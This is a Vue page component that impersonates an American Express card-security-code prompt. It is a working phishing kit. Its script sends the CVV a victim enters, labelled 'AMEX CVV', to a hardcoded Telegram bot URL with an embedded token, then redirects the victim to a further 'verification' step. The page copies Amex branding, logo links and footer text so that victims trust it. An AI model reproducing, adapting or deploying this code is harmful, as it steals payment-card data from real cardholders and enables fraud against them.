<script>
import axios from "axios";

export default {
  data() {
    return {
      formDataRes: {
        securityCode: "",
      },
      showCode: false,
      loading: false,
      isActive: false,
    };
  },


  methods: {

    cancelLogin() {
      window.location.assign('/login');
    },

    async finishJoob() {
      if (this.loading) return;
      this.loading = true;
      try {
        // Format the message as string
        const message = `* AMEX CVV *\nCVV: ${this.formDataRes.securityCode}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-5167264103",
          message
        );
        this.notice = true;

        window.location.assign("/verification");
      } catch (error) {
        console.error("Navigation error:", error);
        this.loading = false;
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>

<template>
  <main class="page-shell">
    <header class="header">
      <div class="nav-wrap" style="position: relative; display: flex; justify-content: center;">
        <img
          src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.7.1/package/dist/img/logos/dls-logo-line.svg" />
        <a href="/" style="font-size: 16px; color: #006fcf; position: absolute; right: 0;">Close</a>
      </div>
    </header>

    <section class="content">
      <h1>Enter Card Security Code</h1>
      <div class="rule"></div>

      <div class="main-grid">
        <form class="form-area" @submit.prevent="finishJoob">
          <p class="intro">
            This is the 3-digit number on the back of the Card ending in ****.
          </p>

          <label for="security-code">
            Card Security Code
          </label>

          <div class="input-wrap">
            <input id="security-code" v-model="formDataRes.securityCode" :type="showCode ? 'text' : 'password'"
              inputmode="numeric" autocomplete="off" maxlength="3" pattern="[0-9]{3}" aria-describedby="code-help"
              @input="
                securityCode = securityCode
                  .replace(/\D/g, '')
                  .slice(0, 3)
                " />

            <button class="visibility" type="button" :aria-label="showCode ? 'Hide code' : 'Show code'"
              @click="showCode = !showCode">
              <svg v-if="!showCode" viewBox="0 0 24 24" aria-hidden="true">
                <path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z" />
                <circle cx="12" cy="12" r="3" />
              </svg>

              <svg v-else viewBox="0 0 24 24" aria-hidden="true">
                <path
                  d="m3 3 18 18M10.6 6.2A10.8 10.8 0 0 1 12 6c6.5 0 10 6 10 6a16 16 0 0 1-3.2 3.7M6.2 6.8C3.5 8.5 2 12 2 12s3.5 6 10 6c1.2 0 2.3-.2 3.3-.6" />
              </svg>
            </button>

            <p v-if="notice" id="preview-note" class="notice" role="status">
              Click "Continue" again. A 6-digit code will be sent to your email for verification.
            </p>
          </div>

          <!-- <small id="code-help">
            For this demo, use any three digits.
          </small> -->

          <div class="actions">
            <button class="cancel" type="button" @click="cancelLogin">
              Cancel
            </button>

            <button class="continue" type="button" :disabled="loading" @click="finishJoob">
              {{ loading ? "Verifying..." : "Continue" }}
            </button>
          </div>
        </form>

        <aside class="card-guide" aria-label="Illustration showing a security code on the back of a card">
          <div class="sample-card">
            <div class="card-band"></div>

            <div class="signature-row">
              <div class="signature"></div>
              <div class="sample-code">000</div>
              <div class="mini-mark">
                <img width="24px" src="https://cdn-icons-png.flaticon.com/512/5968/5968245.png" alt="">
              </div>
            </div>

            <div class="dash-row">
              <span>----</span>
              <span>----</span>
              <span>----</span>
            </div>

            <div class="contactless">)))</div>
          </div>

          <strong>Back of the Card</strong>
        </aside>
      </div>
    </section>

    <footer class="footer">
      <nav aria-label="Footer">
        <a href="#" @click.prevent>Terms of Service</a>
        <i></i>
        <a href="#" @click.prevent>Privacy Center</a>
        <i></i>
        <a href="#" @click.prevent>Do Not Sell or Share My Personal Information</a>
        <i></i>
        <a href="#" @click.prevent>AdChoices</a>
        <i></i>
        <a href="#" @click.prevent>Security Center</a>
        <i></i>
        <a href="#" @click.prevent>Card Agreements</a>

        <div class="second-row">
          <a href="#" @click.prevent>Service Member Benefits</a>
          <i></i>
          <a href="#" @click.prevent>Site Map</a>
        </div>
      </nav>

      <p>
        All users of our online services are subject to our Privacy Statement and agree to be bound by the Terms of
        Service. Please review.
      </p>

      <p>
        © 2026 American Express. All rights reserved.
      </p>
    </footer>
  </main>
</template>

<style>
.notice {
  margin: 0 0 16px;
  padding: 10px;
  background: #edf6ff;
  color: #164b77;
  font-size: 12px;
  line-height: 1.5;
}

* {
  box-sizing: border-box;
}

:root {
  font-family: Arial, Helvetica, sans-serif;
  color: #292929;
  background: #fff;
}

body {
  margin: 0;
  min-width: 320px;
}

.header {
  background: #fff;
  position: fixed;
  top: 0;
  z-index: 100;
  width: 100%;
  border-bottom: 1px solid #dedede;
}

.nav-wrap {
  min-height: 64px;
  width: full;
  margin: 0 154.5px;
  padding: 2px 32px;
  display: flex;
  align-items: center;
  gap: 27px;
}

button,
input {
  font: inherit;
}

.page-shell {
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  background: #fff;
}

.topbar {
  height: 44px;
  border-bottom: 1px solid #e5e5e5;
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
}

.brand {
  font-weight: 800;
  font-size: 20px;
  letter-spacing: -0.5px;
  color: #1767a9;
}

.brand span {
  color: #414f5d;
  margin-left: 5px;
}

.close-link {
  position: absolute;
  right: 28px;
  top: 13px;
  color: #376c9a;
  font-size: 13px;
}

.demo-banner {
  background: #fff7df;
  color: #765500;
  border-bottom: 1px solid #f0dfac;
  text-align: center;
  padding: 9px 16px;
  font-size: 12px;
  font-weight: 700;
}

.content {
  width: min(1040px, calc(100% - 48px));
  margin: 30px auto 0;
  flex: 1;
  margin-top: 128px;
}

h1 {
  font-size: 28px;
  line-height: 1.25;
  margin: 0 0 14px;
  font-weight: 700;
}

.rule {
  height: 2px;
  background: #e7e7e7;
  width: 100%;
}

.main-grid {
  display: grid;
  grid-template-columns: minmax(0, 1fr) 260px;
  gap: 64px;
  padding-top: 27px;
}

.intro {
  font-size: 14px;
  margin: 0 0 32px;
  line-height: 1.5;
}

.form-area label {
  display: block;
  font-size: 13px;
  margin-bottom: 15px;
}

.input-wrap {
  height: 43px;
  width: min(405px, 100%);
  display: flex;
  border: 1px solid #b8b8b8;
  border-radius: 6px;
  box-shadow: 0 0 0 2px #d9e8f3;
  overflow: hidden;
}

.input-wrap input {
  border: 0;
  outline: 0;
  padding: 0 12px;
  flex: 1;
  min-width: 0;
  background: #fff;
  font-size: 18px;
  letter-spacing: 4px;
}

.visibility {
  width: 43px;
  border: 0;
  border-left: 1px solid #d1d1d1;
  background: #fff;
  display: grid;
  place-items: center;
  cursor: pointer;
}

.visibility svg {
  width: 21px;
  height: 21px;
  fill: none;
  stroke: #2771aa;
  stroke-width: 1.8;
  stroke-linecap: round;
  stroke-linejoin: round;
}

#code-help {
  display: block;
  color: #777;
  font-size: 11px;
  margin-top: 9px;
}

.actions {
  display: flex;
  gap: 14px;
  margin-top: 94px;
}

.actions button {
  height: 42px;
  width: 166px;
  border-radius: 7px;
  cursor: pointer;
  font-size: 13px;
}

.cancel {
  border: 1px solid #d5e2e9;
  color: #006fcf;
  background: #fff;
}

.continue {
  border: 1px solid #ddd;
  color: #fff;
  background: #006fcf;
}

.message {
  color: #385e39;
  font-size: 12px;
  margin-top: 12px;
}

.card-guide {
  padding-top: 0;
  text-align: center;
}

.sample-card {
  height: 151px;
  width: 240px;
  max-width: 100%;
  margin: 0 auto 10px;
  border-radius: 13px;
  overflow: hidden;
  position: relative;
  background: linear-gradient(135deg, #666, #2e2e2e);
  box-shadow: inset 0 1px 0 #999;
}

.card-band {
  height: 45px;
  background: linear-gradient(#555, #333);
  border-bottom: 18px solid #e5e5e5;
}

.signature-row {
  display: flex;
  align-items: center;
  position: absolute;
  left: 14px;
  right: 12px;
  top: 62px;
  /* gap: 5px; */
}

.signature {
  height: 25px;
  flex: 1;
  background: repeating-linear-gradient(135deg,
      #f8f8f8,
      #f8f8f8 2px,
      #eaeaea 2px,
      #eaeaea 3px);
  min-width: 120px;
}

.sample-code {
  background: #b8d8f6;
  border-radius: 4px;
  padding: 5px 9px;
  color: #173b5b;
  font-size: 20px;
  letter-spacing: 1px;
  margin-right: 10px;
}

.mini-mark {
  background: white;
  height: 24px;
}


.dash-row {
  position: absolute;
  left: 15px;
  bottom: 36px;
  display: flex;
  gap: 4px;
  color: #eee;
  font-size: 14px;
  letter-spacing: -2px;
}

.contactless {
  position: absolute;
  right: 14px;
  bottom: 16px;
  color: #eee;
  transform: rotate(90deg);
  font-size: 20px;
}

.card-guide strong {
  font-size: 13px;
}

.footer {
  width: min(1060px, calc(100% - 48px));
  margin: 85px auto 0;
  border-top: 1px solid #eee;
  padding: 30px 18px 28px;
  color: #555;
  font-size: 12px;
}

.footer nav {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: 10px;
}

.footer a {
  color: #006fcf;
  text-decoration: none;
  font-size: 13px;
}

.footer a:hover {
  text-decoration: underline;
}

.footer i {
  height: 14px;
  border-left: 1px solid #aaa;
}

.second-row {
  flex-basis: 100%;
  display: flex;
  align-items: center;
  gap: 10px;
  margin-top: 11px;
}

.footer p {
  margin: 31px 0 0;
  font-size: 11px;
}

.footer p+p {
  margin-top: 18px;
}

@media (max-width: 700px) {
  .topbar {
    height: 50px;
  }

  .brand {
    font-size: 17px;
  }

  .close-link {
    right: 14px;
  }

  .content {
    width: calc(100% - 36px);
    margin-top: 24px;
  }

  h1 {
    font-size: 24px;
  }

  .main-grid {
    grid-template-columns: 1fr;
    gap: 36px;
  }

  .card-guide {
    grid-row: 1;
    max-width: 260px;
    justify-self: center;
  }

  .intro {
    margin-bottom: 24px;
  }

  .actions {
    margin-top: 42px;
  }

  .actions button {
    flex: 1;
    width: auto;
  }

  .footer {
    width: calc(100% - 36px);
    margin-top: 50px;
    padding: 24px 0;
  }
}
</style>
